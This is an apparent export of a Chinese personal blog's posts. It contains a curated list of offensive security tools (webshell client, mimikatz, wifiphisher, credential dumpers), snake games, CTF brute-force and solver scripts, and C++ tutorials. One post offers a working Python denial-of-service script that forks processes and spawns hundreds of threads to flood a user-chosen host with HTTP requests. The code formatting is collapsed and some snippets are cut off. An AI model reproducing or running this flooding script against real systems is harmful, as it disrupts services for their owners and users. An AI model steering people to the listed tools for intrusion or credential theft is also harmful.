https://github.com/rootphantomer/hack\\_tools\\_for\\_me XSS数据接收平台 https://github.com/firesunCN/BlueLotus\\_XSSReceiver XSS与CSRF工具 https://github.com/evilcos/xssor Short for command injection exploiter，web向命令注入检测工具 https://github.com/stasinopoulos/commix 数据库注入工具 https://github.com/sqlmapproject/sqlmap Web代理，通过加载sqlmap api进行sqli实时检测 https://github.com/zt2/sqli-hunter 新版中国菜刀 https://github.com/Chora10/Cknife .git泄露利用EXP https://github.com/lijiejie/GitHack 浏览器攻击框架 https://github.com/beefproject/beef 自动化绕过WAF脚本 https://github.com/khalilbijjou/WAFNinja http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl） https://github.com/jkbrzt/httpie 浏览器调试利器 https://github.com/firebug/firebug 一款开源WAF https://github.com/SpiderLabs/ModSecurity windows域渗透工具： windows渗透神器 https://github.com/gentilkiwi/mimikatz Powershell渗透库合集 https://github.com/PowerShellMafia/PowerSploit Powershell tools合集 https://github.com/clymb3r/PowerShell Fuzz: Web向Fuzz工具 https://github.com/xmendez/wfuzz HTTP暴力破解，撞库攻击脚本 https://github.com/lijiejie/htpwdScan 漏洞利用及攻击框架： msf https://github.com/rapid7/metasploit-framework Poc调用框架，可加载Pocsuite,Tangscan，Beebeeto等 https://github.com/erevus-cn/pocscan Pocsuite https://github.com/knownsec/Pocsuite Beebeeto https://github.com/n0tr00t/Beebeeto-framework 漏洞POC&amp;EXP: ExploitDB官方git版本 https://github.com/offensive-security/exploit-database php漏洞代码分析 https://github.com/80vul/phpcodz Simple test for CVE-2016-2107 https://github.com/FiloSottile/CVE-2016-2107 CVE-2015-7547 POC https://github.com/fjserna/CVE-2015-7547 JAVA反序列化POC生成工具 https://github.com/frohoff/ysoserial JAVA反序列化EXP https://github.com/foxglovesec/JavaUnserializeExploits Jenkins CommonCollections EXP https://github.com/CaledoniaProject/jenkins-cli-exploit CVE-2015-2426 EXP (windows内核提权) https://github.com/vlad902/hacking-team-windows-kernel-lpe use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示) https://github.com/hxer/vulnapp php7缓存覆写漏洞Demo及相关工具 https://github.com/GoSecure/php7-opcache-override XcodeGhost木马样本 https://github.com/XcodeGhostSource/XcodeGhost 中间人攻击及钓鱼 中间人攻击框架 https://github.com/secretsquirrel/the-backdoor-factory https://github.com/secretsquirrel/BDFProxy https://github.com/byt3bl33d3r/MITMf Inject code, jam wifi, and spy on wifi users https://github.com/DanMcInerney/LANs.py 可扩展的中间人代理工具 https://github.com/intrepidusgroup/mallory wifi钓鱼 https://github.com/sophron/wifiphisher 密码破解： 密码破解工具 https://github.com/shinnok/johnny 本地存储的各类密码提取利器 https://github.com/AlessandroZ/LaZagne 二进制及代码分析工具： 二进制分析工具 https://github.com/devttys0/binwalk 系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息 https://github.com/quarkslab/binmap rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O (doesn’t support the FAT binaries) x86/x64 binaries. https://github.com/0vercl0k/rp Windows Exploit Development工具 https://github.com/lillypad/badger 二进制静态分析工具（python） https://github.com/bdcht/amoco Python Exploit Development Assistance for GDB https://github.com/longld/peda 对BillGates Linux Botnet系木马活动的监控工具 https://github.com/ValdikSS/billgates-botnet-tracker 木马配置参数提取工具 https://github.com/kevthehermit/RATDecoders Shellphish编写的二进制分析工具（CTF向） https://github.com/angr/angr 针对python的静态代码分析工具 https://github.com/yinwang0/pysonar2 一个自动化的脚本（shell）分析工具，用来给出警告和建议 https://github.com/koalaman/shellcheck 基于AST变换的简易Javascript反混淆辅助工具 https://github.com/ChiChou/etacsufbo EXP编写框架及工具： 二进制EXP编写工具 https://github.com/t00sh/rop-tool CTF Pwn 类题目脚本编写框架 https://github.com/Gallopsled/pwntools an easy-to-use io library for pwning development https://github.com/zTrix/zio 跨平台注入工具（ Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.） https://github.com/frida/frida 隐写： 隐写检测工具 https://github.com/abeluck/stegdetect 各类安全资料: 域渗透教程 https://github.com/l3m0n/pentest\\_study python security教程（原文链接http://www.primalsecurity.net/tutorials/python-tutorials/） https://github.com/smartFlash/pySecurity data_hacking合集 https://github.com/ClickSecurity/data\\_hacking mobile-security-wiki https://github.com/exploitprotocol/mobile-security-wiki 书籍《reverse-engineering-for-beginners》 https://github.com/veficos/reverse-engineering-for-beginners 一些信息安全标准及设备配置 https://github.com/luyg24/IT\\_security APT相关笔记 https://github.com/kbandla/APTnotes Kcon资料 https://github.com/knownsec/KCon ctf及黑客资源合集 https://github.com/bt3gl/My-Gray-Hacker-Resources ctf和安全工具大合集 https://github.com/zardus/ctf-tools 《DO NOT FUCK WITH A HACKER》 https://github.com/citypw/DNFWAH 各类CTF资源 近年ctf writeup大全 https://github.com/ctfs/write-ups-2016 https://github.com/ctfs/write-ups-2015 https://github.com/ctfs/write-ups-2014 fbctf竞赛平台Demo https://github.com/facebook/fbctf ctf Resources https://github.com/ctfs/resources 各类编程资源: 大礼包（什么都有） https://github.com/bayandin/awesome-awesomeness bash-handbook https://github.com/denysdovhan/bash-handbook python资源大全 https://github.com/jobbole/awesome-python-cn git学习资料 https://github.com/xirong/my-git 安卓开源代码解析 https://github.com/android-cn/android-open-project-analysis python框架，库，资源大合集 https://github.com/vinta/awesome-python JS 正则表达式库（用于简化构造复杂的JS正则表达式） https://github.com/VerbalExpressions/JSVerbalExpressions Python： python 正则表达式库（用于简化构造复杂的python正则表达式） https://github.com/VerbalExpressions/PythonVerbalExpressions python任务管理以及命令执行库 https://github.com/pyinvoke/invoke python exe打包库 https://github.com/pyinstaller/pyinstaller py3 爬虫框架 https://github.com/orf/cyborg 一个提供底层接口数据包编程和网络协议支持的python库 https://github.com/CoreSecurity/impacket python requests 库 https://github.com/kennethreitz/requests python 实用工具合集 https://github.com/mahmoud/boltons python爬虫系统 https://github.com/binux/pyspider ctf向 python工具包 https://github.com/P1kachu/v0lt 科学上网： 科学上网工具 https://github.com/XX-net/XX-Net 福利： 微信自动抢红包动态库 https://github.com/east520/AutoGetRedEnv 微信抢红包插件（安卓版） https://github.com/geeeeeeeeek/WeChatLuckyMoney 神器 https://github.com/yangyangwithgnu/hardseed","categories":[{"name":"Ctf","slug":"Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/"}],"tags":[]},{"title":"python实现交互式shell","slug":"python-active-shell","date":"2017-02-26T16:19:35.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/python-active-shell/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/python-active-shell/index.html","excerpt":"","text":"#! /usr/bin/env python #coding=utf-8import sysimport osimport commandsimport getpassimport socketimport signal def handler(signal_num,frame): print “\\nGood bye!” sys.exit(signal_num)signal.signal(signal.SIGINT,handler)oldpwd=commands.getstatusoutput(‘echo $OLDPWD’)[1]while True: status,pwd=commands.getstatusoutput(‘pwd’) s=raw_input(“\\033[1;31m”+getpass.getuser()+”@”+socket.gethostname()+”:”+”\\033[1;32m”+pwd+”\\033[1;0m # “) try: if “exit” in s: print “Good Bye!” break t=s.split(‘ ‘) if t[0]==’cd’: tmp=commands.getstatusoutput(‘pwd’)[1] if t[1]==’-‘: os.chdir(oldpwd) oldpwd=tmp continue path=t[1].split(‘/‘) if path[0]==’~’: p2=’/root’ for i in path: if i==’~’: break p2=p2+’/‘+i os.chdir(p2) oldpwd=tmp continue os.chdir(t[1]) continue exec(s) except: os.system(s)","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/"}],"tags":[]},{"title":"html5实现贪吃蛇游戏","slug":"html5-greddy-snake","date":"2017-02-09T04:45:08.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/html5-greddy-snake/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/html5-greddy-snake/index.html","excerpt":"","text":"Greedy Snake 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204 \\* &#123; margin: 0; padding: 0; &#125; html, body &#123; height: 100%; width: 100%; &#125; canvas &#123; display: block; &#125; function onLoad() &#123; document.addEventListener(\"deviceready\", onDeviceReady, false); &#125; // PhoneGap is ready // function onDeviceReady() &#123; var h = screen.height - 40; var w = screen.width - 20; var c=document.getElementById(\"myCanvas\"); c.setAttribute('width', w); c.setAttribute('height', h); var cxt=c.getContext(\"2d\"); cxt.fillStyle=\"#FF0000\"; cxt.fillRect(0,0,w,h); &#125; var c=document.getElementById(\"canvas\"); var ctx=c.getContext(\"2d\"); /*var ButtonReady=false; var ButtonImage=new Image(); ButtonImage.onload=function()&#123; ButtonReady=true; &#125;; ButtonImage.src=\"images/buttons.jpg\"; ctx.drawImage(ButtonImage,0,$(\"canvas\").height()/2,$(\"canvas\").width()/3,$(\"canvas\").height()/2); */ while($(window).get(0).innerWidth&lt;$(window).get(0).innerHeight)&#123; alert(\"请使手机横屏\"); &#125; $(window).resize(resizeCanvas); function resizeCanvas() &#123; $(\"canvas\").attr(\"width\", $(window).get(0).innerWidth); $(\"canvas\").attr(\"height\", $(window).get(0).innerHeight); ctx.fillStyle=\"#00FF00\"; for(var m=0;m&lt;50;m++)&#123; ctx.fillRect($(\"canvas\").width()/3-$(\"canvas\").width()/150,m*$(\"canvas\").height()/50,$(\"canvas\").width()/150,$(\"canvas\").height()/50); ctx.fillRect($(\"canvas\").width()\\*2/3+$(\"canvas\").width()/150,m\\*$(\"canvas\").height()/50,$(\"canvas\").width()/150,$(\"canvas\").height()/50); &#125; /*ctx.fillStyle=\"#FFFFFF\"; ctx.fillRect(0, 0, $(\"canvas\").width(), $(\"canvas\").height()); ctx.drawImage(ButtonImage,0,$(\"canvas\").height()/2,$(\"canvas\").width()/3,$(\"canvas\").height()/2); */ &#125;; resizeCanvas(); var time=500; var x=y=8; var food_x=0; var food_y=0; var snake=\\[\\]; var dir=2; var grow=true; function is_alive()&#123; for(var i=1;i&lt;snake.length;i++)&#123; if(snake\\[i\\].x==snake\\[0\\].x &amp;&amp; snake\\[i\\].y==snake\\[0\\].y) return false; &#125; if(snake\\[0\\].x==0 || snake\\[0\\].y==0 || snake\\[0\\].x==50 || snake\\[0\\].y==50)&#123; return false; &#125; return true; &#125; function formFood()&#123; while(true)&#123; food_x=Math.floor(Math.random()*49+1); food_y=Math.floor(Math.random()*49+1); var flag=true; for(sec in snake)&#123; if(sec.x==food\\_x&amp;&amp;sec.y==food\\_y)&#123; flag=false; break; &#125; &#125; if(flag) break; &#125; ctx.fillStyle=\"#FF0000\"; ctx.fillRect($(\"canvas\").width()/3+food_x*$(\"canvas\").width()/150, food_y*$(\"canvas\").height()/50, $(\"canvas\").width()/150, $(\"canvas\").height()/50); &#125; function movesnake()&#123; if(!grow)&#123; ctx.clearRect($(\"canvas\").width()/3+snake\\[snake.length-1\\].x*$(\"canvas\").width()/150-1, snake\\[snake.length-1\\].y*$(\"canvas\").height()/50-1, $(\"canvas\").width()/150+2, $(\"canvas\").height()/50+2); for(var i=snake.length-1;i&gt;0;i--)&#123; snake\\[i\\].x=snake\\[i-1\\].x; snake\\[i\\].y=snake\\[i-1\\].y; &#125; &#125; else&#123; snake.push(&#123;x:snake\\[snake.length-1\\].x,y:snake\\[snake.length-1\\].y&#125;); for(var i=snake.length-2;i&gt;0;i--)&#123; snake\\[i\\].x=snake\\[i-1\\].x; snake\\[i\\].y=snake\\[i-1\\].y; &#125; grow=false; &#125; switch(dir)&#123; case 1:&#123; snake\\[0\\].x--; break; &#125; case 2:&#123; snake\\[0\\].x++; break; &#125; case 3:&#123; snake\\[0\\].y--; break; &#125; case 4:&#123; snake\\[0\\].y++; break; &#125; default:&#123; alert(\"call on defult\"); &#125; &#125; ctx.fillStyle=\"#000000\"; ctx.fillRect($(\"canvas\").width()/3+snake\\[0\\].x*$(\"canvas\").width()/150, snake\\[0\\].y*$(\"canvas\").height()/50, $(\"canvas\").width()/150, $(\"canvas\").height()/50); if(!is_alive())&#123; alert(\"蛇死掉了！蛇的最终长度为：\"+snake.length); window.location.reload(); &#125; if(snake\\[0\\].x==food\\_x&amp;&amp;snake\\[0\\].y==food\\_y)&#123; grow=true; formFood(); &#125; &#125; snake.push(&#123;x:25,y:25&#125;); snake.push(&#123;x:24,y:25&#125;); snake.push(&#123;x:23,y:25&#125;); snake.push(&#123;x:22,y:25&#125;); for(var i=0;i&lt;snake.length;i++)&#123; ctx.fillStyle=\"#000000\"; ctx.fillRect($(\"canvas\").width()/3+snake\\[i\\].x*$(\"canvas\").width()/150, snake\\[i\\].y*$(\"canvas\").height()/50, $(\"canvas\").width()/150, $(\"canvas\").height()/50); &#125; formFood(); setInterval(\"movesnake()\",500); canvas.onmousedown = function(e)&#123; switch(dir)&#123; case 1:&#123; &#125; case 2:&#123; if(e.pageY&gt;snake\\[0\\].y*$(\"canvas\").height()/50)dir=4; else dir=3; break; &#125; case 3:&#123; &#125; case 4:&#123; if(e.pageX&gt;$(\"canvas\").width()/3+snake\\[0\\].x*$(\"canvas\").width()/150)dir=2; else dir=1; break; &#125; default:&#123; alert(\"call on defult\"); &#125; &#125; &#125; ;","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/"}],"tags":[]},{"title":"i春秋欢乐赛web象棋python爆破","slug":"ichunqiu-xiangqi-crack-py","date":"2017-02-07T11:05:26.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/ichunqiu-xiangqi-crack-py/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/ichunqiu-xiangqi-crack-py/index.html","excerpt":"","text":"import urllib2import urllibimport timeimport threading global is_cracked=False def crack(m): for t in m: if is_cracked: break try: print urllib2.urlopen(“http://9bcc1a1a7dda42f9ba608c15d17187a7280921b9ef534c7b.ctf.game/js/&quot;+t).read() is_cracked=True except: continue def div_list(ls,n): #一个常用的分割字符串的函数 if not isinstance(ls,list) or not isinstance(n,int): return [] ls_len = len(ls) if n&lt;=0 or 0==ls_len: return [] if n &gt; ls_len: return [] elif n == ls_len: return [[i] for i in ls] else: j = ls_len/n k = ls_len%n ls_return = [] for i in xrange(0,(n-1)j,j): ls_return.append(ls[i:i+j]) ls_return.append(ls[(n-1)j:]) return ls_return s1=”abcmlyx”query=[]for m in s1: for t in s1: for q in xrange(0,10): for r in xrange(0,10): for v in xrange(0,10): query.append(“%s%sctf%d%d%d\\n”%(m,t,q,r,v)) ls2=div_list(query,50)for ea in ls2: t=threading.Thread(target=crack,args=(ea,)) t.start()t.join()","categories":[{"name":"Ctf","slug":"Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/"},{"name":"web","slug":"Ctf/web","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/web/"}],"tags":[]},{"title":"双向链表与easyx实现简易贪吃蛇","slug":"greedy-snake","date":"2017-01-29T03:30:10.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/greedy-snake/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/greedy-snake/index.html","excerpt":"","text":"/**文件:snake.cpp 编写者:image编写日期:2017年1月28号 简要描述:贪吃蛇游戏，可加速**/ #include “stdafx.h” #include #include #include #include #define FRAME_WIDTH 50 #define FRAME_HEIGHT 50using namespace std;enum direction { t, b, l, r };class Snake;struct food{ int pos_x, pos_y;};class section { section front; section rear; direction direct; int pos_x, pos_y; friend class Snake;public: section(section fr=NULL,direction dir=t, section re = NULL ) { front=fr; rear = re; direct = dir; pos_x = pos_y = 25; } section makenext() { rear = new section(this,this-&gt;direct); switch (this-&gt;direct) { case 0: { rear-&gt;pos_x = this-&gt;pos_x; rear-&gt;pos_y = this-&gt;pos_y + 1; break; } case 1: { rear-&gt;pos_x = this-&gt;pos_x; rear-&gt;pos_y = this-&gt;pos_y - 1; break; } case 2: { rear-&gt;pos_x = this-&gt;pos_x + 1; rear-&gt;pos_y = this-&gt;pos_y; break; } case 3: { rear-&gt;pos_x = this-&gt;pos_x - 1; rear-&gt;pos_y = this-&gt;pos_y; break; } } return rear; } void move() { setcolor(BLACK); setfillcolor(BLACK); fillcircle(pos_x 480 / FRAME_WIDTH, pos_y 480 / FRAME_HEIGHT, 480 / FRAME_WIDTH / 2); switch (this-&gt;direct) { case 0: { this-&gt;pos_x = this-&gt;pos_x; this-&gt;pos_y = this-&gt;pos_y - 1; break; } case 1: { this-&gt;pos_x = this-&gt;pos_x; this-&gt;pos_y = this-&gt;pos_y + 1; break; } case 2: { this-&gt;pos_x = this-&gt;pos_x - 1; this-&gt;pos_y = this-&gt;pos_y; break; } case 3: { this-&gt;pos_x = this-&gt;pos_x + 1; this-&gt;pos_y = this-&gt;pos_y; break; } } if (this-&gt;front == NULL) setfillcolor(RED); else setfillcolor(GREEN); fillcircle(pos_x 480/FRAME_WIDTH, pos_y * 480/FRAME_HEIGHT, 480 / FRAME_WIDTH/2); if(this-&gt;rear!=NULL) this-&gt;rear-&gt;move(); if (this-&gt;front != NULL&amp;&amp;this-&gt;direct != this-&gt;front-&gt;direct) this-&gt;direct = this-&gt;front-&gt;direct; } };class Snake { section head; section tail; int length; int eatentimes;public: food foo; Snake() { this-&gt;head =this-&gt;tail= new section(); this-&gt;length = 1; eatentimes = 0; } void Add() { tail=tail-&gt;makenext(); length++; } bool is_alive() { section p = head-&gt;rear; while(p != NULL) { if (p-&gt;pos_x == head-&gt;pos_x&amp;&amp;p-&gt;pos_y == head-&gt;pos_y) { return false; } p = p-&gt;rear; } return head-&gt;pos_x != 0 &amp;&amp; head-&gt;pos_y != 0 &amp;&amp; head-&gt;pos_x != FRAME_WIDTH &amp;&amp; head-&gt;pos_y != FRAME_HEIGHT; } void move() { head-&gt;move(); if (is_Food()) { if (eatentimes == 5) { for (int i = 0; i &lt; 5; i++) Add(); eatentimes = 0; setfillcolor(BLACK); fillcircle(foo.pos_x 480 / FRAME_WIDTH, foo.pos_y * 480 / FRAME_HEIGHT, 480 / FRAME_WIDTH); makeFood(); } else { Add(); makeFood(); } } } void turn(direction dir) { head-&gt;direct = dir; } int getSpeed() { return 5000/length; } void makeFood() { int random\\_X = rand() % (FRAME\\_WIDTH-1)+1; int random\\_Y = rand() % (FRAME\\_HEIGHT-1)+1; section *p = head; while (p != NULL) { if (p-&gt;pos\\_x == random\\_X&amp;&amp;p-&gt;pos\\_y == random\\_Y) { random\\_X = rand() % FRAME\\_WIDTH; random\\_Y = rand() % FRAME\\_HEIGHT; } p = p-&gt;rear; } foo.pos\\_x = random\\_X; foo.pos\\_y = random\\_Y; setfillcolor(YELLOW); if(eatentimes==4) fillcircle(foo.pos\\_x * 480 / FRAME\\_WIDTH, foo.pos\\_y * 480 / FRAME\\_HEIGHT, 480 / FRAME_WIDTH ); else fillcircle(foo.pos\\_x * 480 / FRAME\\_WIDTH, foo.pos\\_y * 480 / FRAME\\_HEIGHT, 480 / FRAME_WIDTH /2); eatentimes++; } bool is_Food() { return head-&gt;pos\\_x == foo.pos\\_x&amp;&amp;head-&gt;pos\\_y == foo.pos\\_y; } void Init() { initgraph(480, 480); char ch; makeFood(); for (int i = 0; i &lt; 5; i++) { Add(); } while(true) { int speed = getSpeed(); if (_kbhit()) { if (_kbhit()) { speed /= 2; } ch = _getch(); switch (ch) { case &apos;w&apos;: turn(t); break; case &apos;s&apos;: turn(b); break; case &apos;a&apos;:turn(l); break; case &apos;d&apos;:turn(r); break; } } Sleep(speed); move(); if (!is_alive()) break; } settextcolor(WHITE); outtext(_T(&quot;蛇死掉了 按任意键退出游戏&quot;)); _getch(); } };int main() { srand(time(0)); Snake snake; snake.Init(); }","categories":[{"name":"人生杂谈","slug":"人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/"},{"name":"技术学习","slug":"人生杂谈/技术学习","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/技术学习/"}],"tags":[]},{"title":"python多线程简易ddos","slug":"python-ddos","date":"2017-01-27T05:24:05.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/python-ddos/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/python-ddos/index.html","excerpt":"","text":"#! /usr/bin/env python #coding=utf-8import threadingfrom time import ctime,sleepfrom socket import *import osdef ddos(HOST): PORT=80 ADDR=(HOST,PORT) while True: try: tcpsock=socket(AF_INET,SOCK_STREAM) tcpsock.connect(ADDR) tcpsock.send(“GET / HTTP/1.1\\r\\n”) tcpsock.send(“HOST:localhost\\r\\n\\n”) print “one attack” tcpsock.close() except Exception,e: print “error ocurred”try: host=raw_input(“please enter the destination:”) threads=[] for m in xrange(0,10): os.fork() for i in xrange(0,100): ti=threading.Thread(target=ddos,args=(host,)) threads.append(ti) if __name__==’__main__‘: for t in threads: t.setDaemon(True) t.start() t.join()except Exception,e: print “error occured”","categories":[{"name":"人生杂谈","slug":"人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/"},{"name":"技术学习","slug":"人生杂谈/技术学习","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/技术学习/"}],"tags":[]},{"title":"三种语言实现idf实验室字符统计","slug":"idf-three-ways","date":"2017-01-27T05:00:40.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/idf-three-ways/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/idf-three-ways/index.html","excerpt":"","text":"php: ((.|\\n)*?) /iU”,$content,$conse);$w=0;$o=0;$l=0;$d=0;$y=0;for($i=0;$i$ans);curl_setopt($ch,CURLOPT_POST,true);curl_setopt($ch,CURLOPT_POSTFIELDS,$data); $result=curl_exec($ch);preg_match(“/你(.*?)}/iU”,$result,$str);echo $str[0].”\\n”;?&gt; python: #! /usr/bin/env python #coding=utf-8import cookielibimport urllibimport urllib2from bs4 import BeautifulSoupcookie=cookielib.MozillaCookieJar()handler=urllib2.HTTPCookieProcessor(cookie)opener=urllib2.build_opener(handler)response=opener.open(‘http://ctf.idf.cn/game/pro/37/&#39;)s=BeautifulSoup(response.read(),”lxml”)query=unicode(s.body.text)w=query.count(‘w’)-1o=query.count(‘o’)-1l=query.count(‘l’)-1d=query.count(‘d’)-1y=query.count(‘y’)-1answer=’%d%d%d%d%d’%(w,o,l,d,y)value={“anwser”:answer}DATA=urllib.urlencode(value)req=urllib2.Request(“http://ctf.idf.cn/game/pro/37/&quot;,DATA)ans=opener.open(req)text=unicode(BeautifulSoup(ans.read(),”lxml”).body.text)print text[text.index(u”你”):text.index(‘}’)+1] java: import java.util.HashMap;import java.util.List;import java.util.Map; import org.jsoup.Connection;import org.jsoup.Jsoup;import org.jsoup.Connection.Method;import org.jsoup.Connection.Response;import org.jsoup.nodes.Document;import org.jsoup.nodes.Element;import java.io.IOException;class solve{ public static void main(String args[]){ try{ String url=”http://ctf.idf.cn/game/pro/37/&quot;; Map cookies=null; Response res=Jsoup.connect(url).execute(); cookies=res.cookies(); Document doc=res.parse(); String conse=doc.text(); int w=-1,o=-1,l=-1,d=-1,y=-1; for(int i=0;i","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://hexo.imagemlt.xyz/categories/Crypto/"},{"name":"Ctf","slug":"Crypto/Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Crypto/Ctf/"}],"tags":[]},{"title":"c++引用作为函数的参数与函数的返回值","slug":"c-plus-reference","date":"2016-12-22T13:40:19.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/c-plus-reference/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/c-plus-reference/index.html","excerpt":"","text":"本文转自：http://blog.csdn.net/zhongguoren666/article/details/8523458 “引用作为函数参数”与 “引用作为函数返回值” 一、引用作为函数参数 作为函数参数时引用有两种原因： 1、在函数内部会对此参数进行修改 2、提高函数调用和运行效率 关于第一点，都知道C++里提到函数就会提到形参和实参。如果函数的参数实质就是形参，不过这个形参的作用域只是在函数体内部，也就是说实参和形参是两个不同的东西，要想形参代替实参，肯定有一个值的传递。函数调用时，值的传递机制是通过“形参=实参”来对形参赋值达到传值目的，产生了一个实参的副本。即使函数内部有对参数的修改，也只是针对形参，也就是那个副本，实参不会有任何更改。函数一旦结束，形参生命也宣告终结，做出的修改一样没对任何变量产生影响。 例如： void swap(int p1, int p2) //对两个变量进行交换处理。此处函数的形参为p1, p2，没有引用 { int p; p = p1; p1 = p2; p2 = p; } void main( ) { int a,b; cin &gt;&gt; a &gt;&gt; b; //输入a,b两变量的值 swap(a,b); //直接以变量a和b作为实参调用swap函数 cout &lt;&lt; a &lt;&lt; ‘ ‘ &lt;&lt; b; //输出结果 你会发现输出的a和b还是你输入的值，没有交换。 如果我们改为： void swap(int &amp;p1, int &amp;p2) //对两个变量进行交换处理。此处函数的形参为p1, p2都是引用 { int p; p = p1; p1 = p2; p2 = p; } 再次执行，就会发现值交换了。 原理就在于采用&amp;p1和&amp;p2时，p1和p2是实参的别名而已，像一个指针指向实参。改变p1和p2就是改变实参的值。 关于第二点，可以结合第一点分析，p1和p2是实参的引用，不用经过值的传递机制，已经有了实参值的信息。所以没有了传值和生成副本的时间和空间消耗。当程序对效率要求比较高时，这是非常必要的. 二、引用作为函数返回值 说明： （1）以引用返回函数值，定义函数时需要在函数名前加&amp; （2）用引用返回一个函数值的最大好处是，在内存中不产生被返回值的副本。 例如： #include float temp; //定义全局变量temp float fn1(float r); //声明函数fn1 float &amp;fn2(float r); //声明函数fn2 float fn1(float r) //定义函数fn1，它以返回值的方法返回函数值 { temp=(float)(r*r*3.14); return temp; } float &amp;fn2(float r) //定义函数fn2，它以引用方式返回函数值 { temp=(float)(r*r*3.14); return temp; } void main() //主函数 { float a=fn1(10.0); //第1种情况，系统生成要返回值的副本（即临时变量） float &amp;b=fn1(10.0); //第2种情况，可能会出错（不同 C++系统有不同规定） //不能从被调函数中返回一个临时变量或局部变量的引用 float c=fn2(10.0); //第3种情况，系统不生成返回值的副本 //可以从被调函数中返回一个全局变量的引用 float &amp;d=fn2(10.0); //第4种情况，系统不生成返回值的副本 //可以从被调函数中返回一个全局变量的引用 cout&lt;","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/"}],"tags":[]},{"title":"c++拷贝构造函数与赋值函数","slug":"c-plus-constructor-and-equal","date":"2016-12-21T06:41:47.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/c-plus-constructor-and-equal/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/c-plus-constructor-and-equal/index.html","excerpt":"","text":"赋值运算符和复制构造函数都是用已存在的B对象来创建另一个对象A。不同之处在于：赋值运算符处理两个已有对象，即赋值前B应该是存在的；复制构造函数是生成一个全新的对象，即调用复制构造函数之前A不存在。 CTemp a(b); //复制构造函数，C++风格的初始化 CTemp a=b; //仍然是复制构造函数，不过这种风格只是为了与C兼容，与上面的效果一样，在这之前a不存在，或者说还未构造好。 CTemp a; a=b; //赋值运算符 在这之前a已经通过默认构造函数构造完成。 实例总结： 重点:包含动态分配成员的类 应提供拷贝构造函数,并重载”=”赋值操作符。 以下讨论中将用到的例子: class CExample { public: CExample(){pBuffer=NULL; nSize=0;} ~CExample(){delete pBuffer;} void Init(int n){ pBuffer=new char[n]; nSize=n;} private: char *pBuffer; //类的对象中包含指针,指向动态分配的内存资源 int nSize; }; 这个类的主要特点是包含指向其他资源的指针。 pBuffer指向堆中分配的一段内存空间。 一、拷贝构造函数 调用拷贝构造函数1 int main(int argc, char* argv[]) { CExample theObjone; theObjone.Init(40); //现在需要另一个对象,需要将他初始化称对象一的状态 CExample theObjtwo=theObjone;//拷贝构造函数 … } 语句”CExample theObjtwo=theObjone;”用theObjone初始化theObjtwo。 其完成方式是内存拷贝，复制所有成员的值。 完成后，theObjtwo.pBuffer==theObjone.pBuffer。 即它们将指向同样的地方（地址空间），指针虽然复制了，但所指向的空间内容并没有复制，而是由两个对象共用了。这样不符合要求，对象之间不独立了，并为空间的删除带来隐患。 所以需要采用必要的手段来避免此类情况。 回顾以下此语句的具体过程:通过拷贝构造函数（系统默认的）创建新对象theObjtwo，并没有调用theObjtwo的构造函数（vs2005试验过）。 可以在自定义的拷贝构造函数中添加输出的语句测试。 注意： 对于含有在自由空间分配的成员时，要使用深度复制，不应使用浅复制。 调用拷贝构造函数2 当对象直接作为参数传给函数时，函数将建立对象的临时拷贝，这个拷贝过程也将调同拷贝构造函数。 例如 BOOL testfunc(CExample obj); testfunc(theObjone); //对象直接作为参数。 BOOL testfunc(CExample obj) { //针对obj的操作实际上是针对复制后的临时拷贝进行的 } 调用拷贝构造函数3 当函数中的局部对象被被返回给函数调者时，也将建立此局部对象的一个临时拷贝，拷贝构造函数也将被调用 CTest func() { CTest theTest; return theTest } 二、赋值符的重载 下面的代码与上例相似 int main(int argc, char argv[]) { CExample theObjone; theObjone.Init(40); CExample theObjthree; theObjthree.Init(60); //现在需要一个对象赋值操作,被赋值对象的原内容被清除，并用右边对象的内容填充。 theObjthree=theObjone; return 0; } 也用到了”=”号，但与”一、”中的例子并不同，”一、”的例子中，”=”在对象声明语句中，表示初始化。更多时候,这种初始化也可用括号表示。 例如 CExample theObjone(theObjtwo); 而本例子中，”=”表示赋值操作。将对象theObjone的内容复制到对象theObjthree;，这其中涉及到对象theObjthree原有内容的丢弃，新内容的复制。 但”=”的缺省操作只是将成员变量的值相应复制。旧的值被自然丢弃。 